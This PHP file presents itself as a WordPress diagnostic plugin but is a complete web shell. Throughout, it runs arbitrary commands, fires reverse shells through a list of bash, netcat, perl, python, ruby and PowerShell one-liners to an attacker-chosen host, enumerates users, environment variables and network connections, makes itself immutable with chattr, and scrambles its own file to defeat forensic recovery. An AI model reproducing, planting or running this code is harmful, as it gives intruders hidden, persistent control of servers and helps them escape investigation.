<?php
/*
    Plugin Name: Diagnostic Toolset
    Plugin URI: https://redirecthost.online/
    Description: Run diagnostic tests on the system to determine its health status.
    Author: oldkingcone
    Version: 0.3
    Author URI: https://github.com/oldkingcone
*/
define("split", str_repeat("-", 150));
@ini_set('implicit_flush', 1);
@ini_set('safe_mode', 0);
@ini_set('safe_mode_gid', 0);
@ini_set('file_uploads', 1);
@system("chattr +i " . $_SERVER['SCRIPT_FILENAME']) || @system("chattr +i " . __FILE__);
if (isset($_REQUEST['user']) && isset($_REQUEST['pw'])) {
    $help = <<<_HELP
<pre>
Options to use:
    - qq:
                com for commands, re for reverse shells, dir for directory enumeration stuff, fsociety for user enumeration, and finally leave_system_now to delete the shell from the system.
----------------------------------------------------------------------------------------------------------------------------------------
    com:
                - required param for this, is iamnotroot, this will hold the command you want to execute. can alter this to decode base64 and run it so you can include spaces and chained commands.
                - example: https://someserver.com/path/to/this/script.php?user=&pw=&qq=com&iamnotroot=id
----------------------------------------------------------------------------------------------------------------------------------------
    re:
                - ad: address to connect back to
                - po: port we are listening on
                - m: method to use, think the binary we are going to abuse.
                - example: https://someserver.com/path/to/this/script.php?user=&pw=&qq=re&ad=127.0.0.1&po=8099&m=python3
----------------------------------------------------------------------------------------------------------------------------------------
    dir:
                - dirs: the directory we want to look at with no trailing /
                - example: https://someserver.com/path/to/this/script.php?user=&pw=&qq=dir&dirs=/etc
----------------------------------------------------------------------------------------------------------------------------------------
    fsociety:
                - nothing needed for this.
                - example: https://someserver.com/path/to/this/script.php?user=&pw=&qq=fsociety
----------------------------------------------------------------------------------------------------------------------------------------
    leave_system_now:
                - nothing needed for this. ** BE AWARE, THIS WILL REMOVE THE SHELL FROM THE SYSTEM.
                - example: https://someserver.com/path/to/this/script.php?user=&pw=&qq=leave_system_now
----------------------------------------------------------------------------------------------------------------------------------------
    env:
                - enumerate over the env variables.
                - example: https://someserver.com/path/to/this/script.php?user=&pw=&qq=env
----------------------------------------------------------------------------------------------------------------------------------------
</pre>
_HELP;
    $valid_passwords = array("CHANGEME" => "CHANGEME");
    $valid_user = array_keys($valid_passwords);
    $user = $_REQUEST['user'];
    $pass = $_REQUEST['pw'];
    if ((in_array($user, $valid_user)) && ($pass == $valid_passwords[$user])) {
        check_system();
        if ($_REQUEST['qq'] === "com") {
            executeCommand($_REQUEST['iamnotroot']);
            die();
        } elseif ($_REQUEST['qq'] === "re") {
            if (!isset($_REQUEST['ad'])) {
                $r = $_SERVER['REMOTE_ADDR'];
            } else {
                $r = $_REQUEST['ad'];
            }
            if (!isset($_REQUEST['po'])) {
                $p = "8099";
            } else {
                $p = $_REQUEST['po'];
            }
            if (!isset($_REQUEST['a'])) {
                $blast = false;
            } else {
                $blast = $_REQUEST['a'];
            }
            if (isset($_REQUEST['m'])) {
                $m = $_REQUEST['m'];
            } else {
                $m = '';
            }
            comm($r, $p, (bool)$blast, $m);
            die();
        } elseif ($_REQUEST['qq'] === 'dir') {
            if (isset($_REQUEST['dirs'])) {
                $t = urldecode($_REQUEST['dirs']);
            } else {
                $t = '.';
            }
            echo "Scanning supplied directory: $t<br>";
            clearstatcache(null, $t);
            if (strpos('/', $t, -1) === false) {
                $t = $t . '/';
            }
            foreach (scandir($t) as $dir_entry) {
                if (strpos("..", $dir_entry) === false || strpos('.', $dir_entry) === false) {
                    find_goodies($t, $dir_entry);
                }
            }
        }elseif ($_REQUEST['qq'] == 'fsociety') {
            find_real_users();
            die();
        }elseif ($_REQUEST['qq'] === 'leave_system_now'){
            exit_system();
        }elseif ($_REQUEST['qq'] == 'env'){
            check_env();
        }else{
            echo split."<br>Some Help topics<br>".nl2br($help)."<br>";
        }
    } else {
        not_authenticated();
        die();
    }
} else {
    not_authenticated();
    die();
}
die();
function check_system()
{
    echo "<font color='blue'>Some system information:</font><br>";
    echo "<font color='red'>Uname: </font><font color='green'>" . php_uname() . "</font><br>";
    $os = strpos("windows", php_uname()) ? "Windows" : "Linux";
    if (strpos("windows", php_uname()) !== false) {
        echo split . "<br>";
        echo "<font color='red'>THE OS IS </font><font color='green'>$os</font><br>";
        echo "<br>" . split . "<br>Identified Users: <br>";
        executeCommand("wmic useraccount where \"localaccount=true\" get name");
        echo "<br>" . split . "<br>";
    } else {
        echo split . "<br>";
        echo "<font color='red'>THE OS IS</font><font color='green'> $os</font><br>";
        echo split . "<br>";
    }
    echo "<font color='red'>Directory that we are currently in: </font>" . getcwd(). "<br>";
    echo "<font color='red'>Who we are: </font>" . get_current_user(). "<br>";
    echo "<font color='red'>Our PID: </font>" . getmypid() . "<br>";
    echo "<font color='red'><u><b>Your IP as the server can see it (useful for you to save this information for rev shells.):</b></u></font> " . $_SERVER['REMOTE_ADDR'] . "<br>";
    echo "focusScrollMethod = function getFocus() {document.getElementById(\"myButton\").focus({preventScroll:false});}focusNoScrollMethod = function getFocusWithoutScrolling() {document.getElementById(\"myButton\").focus({preventScroll:true});}<font color='green'> Shall we start a reverse shell?</font><br>";
    echo split."<br>";
    echo "<form action='".$_SERVER['PHP_SELF']."'><input hidden='true' id='user' name='user' value='".$_REQUEST['user']."'><input hidden='true' id='pw' name='pw' value='".$_REQUEST['pw']."'><input hidden='true' id='qq' name='qq' value='re'><label for='ad'>Address: </label><input type='text' id='ad' name='ad' value='".$_SERVER['REMOTE_ADDR']."' required='true'><br><label for='po'>Listener Port: </label><input type='text' id='po' name='po' value='8090' required='true'><br><label>Try All?</label> False:<input type='radio' id='a' name='ab' value=''> True:<input type='radio' id='a' name='a' value='true'><br><label for='m'>Method to use: </label><input type='text' id='m' name='m' value='bash' required='true'><br><input type='submit' value='Submit'></form>";
    echo split."<br>";
    // echo "<font color='red'>GUID: </font>". @posix_getgid() . "<br>". "<font color='red'>UID: </font>". @posix_getuid()."<br>";
    echo "<font color='red'>Include Path: </font>" . get_include_path() . "<br>";
    foreach (stream_get_wrappers() as $wra) {
        echo "<font color='red'>Avail Wrappers: </font>" . $wra . "<br>";
    }
    $t = sys_get_temp_dir();
    echo "<font color='red'>Temp Dir: </font>$t" . find_goodies(sys_get_temp_dir(), '') . "<br>";
    // echo "<font color='red'>Called Classes: </font>" . get_called_class() . "<br>";
    echo "<font color='red'>Hostname: </font>" . gethostname() . "<br>";
    echo split . "<br>";
    echo "<font color='red' onload='getFocus()'>Active Connections: </font><br>";
    check_active_comms();
    echo split . "<br>";
}
function find_real_users()
{
    if (file_exists('/etc/passwd')) {
        $bad_shell = array(
            0 => md5("/usr/sbin/nologin"),
            1 => md5("/bin"),
            2 => md5("/nonexistent"),
            3 => md5("/bin/false"),
            4 => md5("/sbin/nologin")
        );
        $ee = file_get_contents('/etc/passwd');
        echo nl2br("<p onload='getFocus()'>Identified Users: </p>\n");
        foreach (explode("\n", $ee) as $entries) {
            $user = explode(":", $entries);
            if (isset($user[6])) {
                $s = md5($user[6]);
                $h = md5($user[5]);
                if ($s != $bad_shell[0] && $h != $bad_shell[1] && $h != $bad_shell[2] && $s != $bad_shell[3] && $s != $bad_shell[4]) {
                    print("<br><font color='blue'>Real user: </font><font color='green'>$user[0] | Home: $user[5] | Shell: $user[6]</font>");
                }
            }
        }
    }
}
function not_authenticated()
{
    echo "
    <style>
    body{
        background-color: black;
        }
    div.centered {
        color: red;
        background-color: black;
        position: fixed; /* or absolute */
        top: 50%;
        left: 50%;
        /* bring your own prefixes */
        transform: translate(-50%, -50%);
        opacity:1;
        -webkit-transition: opacity 3s;
        -moz-transition: opacity 3s;
        transition: opacity 3s;
    }
    .center{
        align-self: center;
        position: fixed;
        display: block;
        margin-top: 30%;
        left: 40%;
        margin-left: auto;
        margin-right: auto;
        bottom: 0;
        width: auto;
        -webkit-animation: bounce 1s infinite;
        }
        @-webkit-keyframes bounce {
                0% {bottom: 25px;}
                25%,75% {bottom: 35px}
                50% {bottom: 45px}
                100% {bottom:0;}
          }
  </style><div class='centered'><p id='fade'>Hey buddy, I see you stumbled upon this page. You aren't supposed to be here, so please leave.</p></div>";
}
function check_env(){
    foreach (getenv() as $env => $env_val){
        echo "<font color='red'>ENV Entry: </font>" . $env . " => ". $env_val ."<br>";
    }
    echo "<font color='red'>Can we check IPTables?</font><br>";
    echo "<pre>".system("iptables -nvL")."</pre><br>";
}
function executeCommand(string $command)
{
    # Try to find a way to run our command using various PHP internals
    if (function_exists('call_user_func_array')) {
        # http://php.net/manual/en/function.call-user-func-array.php
        echo "Ran with call_user_func_array!<br>";
        call_user_func_array('system', array($command));
    } elseif (function_exists('call_user_func')) {
        # http://php.net/manual/en/function.call-user-func.php
        echo "Ran with call_user_func!<br>";
        call_user_func('system', $command);
    } else if (function_exists('passthru')) {
        # https://www.php.net/manual/en/function.passthru.php
        echo "Ran with passthru!<br>";
        ob_start();
        passthru($command, $return_var);
        echo ob_get_contents();
        ob_end_clean();
    } else if (function_exists('system')) {
        # this is the last resort. chances are PHP Suhosin
        # has system() on a blacklist anyways :>
        # http://php.net/manual/en/function.system.php
        echo "Ran with system!<br>";
        foreach (explode("\n", system($command)) as $ava) {
            echo $ava . "<br>";
        }
    } else if (class_exists('ReflectionFunction')) {
        # http://php.net/manual/en/class.reflectionfunction.php
        echo "Ran with reflection!<br>";
        $function = new ReflectionFunction('system');
        $a = $function->invoke($command);
        foreach (explode("\n", $a) as $v) {
            echo trim($v) . "<br>";
        }
    }
}
function check_active_comms(){
    $common_network_daemons = array(
        "ssh",
        "ftp",
        "telnet",
        "curl",
        "wget",
        "http",
        "bash",
        "postgres",
        "mysql",
        "mongo",
        "couchdb",
        "container",
        "docker",
        "kube",
        "nginx",
        "php",
        "python",
        "ruby",
        "fpm",
        "lua",
        "awk",
        "sed",
        "busybox",
        "openssl",
        "sh",
    );
    echo "<pre>";
    system('netstat -tapulen');
    echo "</pre>";
    foreach($common_network_daemons as $nice_processes){
        echo split."<br>";
        echo "<font color='green'>Checking: ". $nice_processes."</font><br>";
        echo "<pre>";
        system("ps aux | grep ". $nice_processes);
        echo "</pre><br>";
    }
}
function comm(string $host, string $port_num, bool $attempt_all, string $method_to_use)
{
    $useShell = '/bin/sh';
    $comma = array(
        "bash" => sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", $host, $port_num),
        "php" => sprintf("php -r '\$sock=fsockopen(\"%s\",%d);exec(\"%s -i <&3 >&3 2>&3\");'", $host, (int)$port_num, $useShell),
        "nc" => sprintf("nc -e %s \"%s\" %s", $useShell, $host, $port_num),
        "ncS" => sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc \"%s\" %s >/tmp/f", $host, $port_num),
        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $host . "\"," . $port_num . ").to_i;exec sprintf(\"" . $useShell . "\" -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl" => sprintf("perl -e 'use Socket;\$i=\"%s\";\$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", $host, (int)$port_num, $useShell),
        "python" => sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\", %d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", $host, (int)$port_num),
        "python3" => sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\", %d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", $host, (int)$port_num),
        "ps" => "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$host\",$port_num);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()",
        "ps_alt" => "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$host',$port_num);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    );
    echo split . "<br>";
    echo("Avaliable Options to use in the event the chosen one fails:<br>");
    echo split . "<br>";
    foreach ($comma as $methods => $method_string) {
        echo split . "<br>";
        echo "<font color='blue'>Place this value in 'm':</font> <font color='green'>$methods</font><br><font color='blue'>What it does:<br> $method_string</font><br><br>";
        echo split . "<br>";
    }
    if ($method_to_use !== '') {
        $default = $comma[$method_to_use];
    } else {
        $default = $comma['bash'];
    }
    if ($attempt_all === false || $attempt_all === 1) {
        echo split . "<br>";
        echo "<br>Attempting: <br><br>{$default}<br><br>";
        echo split . "<br>";
        executeCommand($default);
        echo split . "<br>";
    } else {
        foreach ($comma as $reverse => $format_strings) {
            echo split . "<br>";
            echo "<br>Attempting: <br><br><p onload='getFocus()' style='background-color: black'><font color='blue'>{$format_strings}</font></p><br><br>";
            echo split . "<br>";
            executeCommand($format_strings);
            echo split . "<br>";
        }
    }
}
function find_goodies(string $directory, string $filename)
{
    $eff_namen = "$directory$filename";
    $aa = is_dir($eff_namen) ? "Directory: " : "File: ";
    echo split . "<br><br><font color='#8b0000' onload='getFocus()'>Checking $aa $directory$filename => </font>";
    if (is_executable($eff_namen) === true) {
        $e = "<font color='#006400'>Executable: Yes</font>";
    } else {
        $e = "<font color='#b22222'>Executable: No</font>";
    }
    if (is_writable($eff_namen) === true) {
        $w = "<font color='#006400'>Writable: Yes</font>";
    } else {
        $w = "<font color='#b22222'>Writable: No</font>";
    }
    if (is_readable($eff_namen) === true) {
        $r = "<font color='#006400'>Readable: Yes</font>";
    } else {
        $r = "<font color='#b22222'>Readable: No</font>";
    }
    echo "<br>| Permissions ". substr(sprintf("%o", fileperms($eff_namen)), -3) . " | $e | $w | $r | ";
    echo "<br>" . split . "<br>";
}
function exit_system(){
    @system('chattr -i '. $_SERVER['SCRIPT_FILENAME']) || @system('chattr -i '. $_SERVER['PHP_SELF']);
    if (function_exists("openssl")){
        echo "Openssl Exists on the system, going to use that instead of other methods.<br>";
        $key = openssl_random_pseudo_bytes(150);
        $iv = openssl_cipher_iv_length('AES-CTR');
        $final = '';
        $in = file_get_contents($_SERVER['SCRIPT_FILENAME']);
        foreach(explode("\n", $in) as $s){
            foreach($s as $l) {
                $final .= openssl_encrypt($l . openssl_random_pseudo_bytes(16), 'AES-CTR', $key, OPENSSL_PKCS1_OAEP_PADDING | OPENSSL_RAW_DATA, (int)$iv);
            }
        }
        file_put_contents($_SERVER['SCRIPT_FILENAME'], $final, LOCK_EX);
        fclose($_SERVER['SCRIPT_FILENAME']);
    }else{
        echo "Openssl did not exist on the system, using random_bytes to try to overwrite the file.<br>";
        $emerge = fopen($_SERVER['SCRIPT_FILENAME'], 'w');
        fclose($emerge);
        $emerge = fopen($_SERVER['SCRIPT_FILENAME'], "a");
        for ($i = 0; $i <= 400; $i++){
            fwrite($emerge, (string)random_bytes(random_int(10,100)));
        }
        fclose($emerge);
    }
    echo "<pre>";
    system('ls -lah .');
    echo "</pre><br>";
    // unlink($_SERVER['SCRIPT_FILENAME']);
    print("Shell should be encrypted/scrambled on disk and deleted making recovery of its contents difficult. Its been fun!<br>");
    die();
}

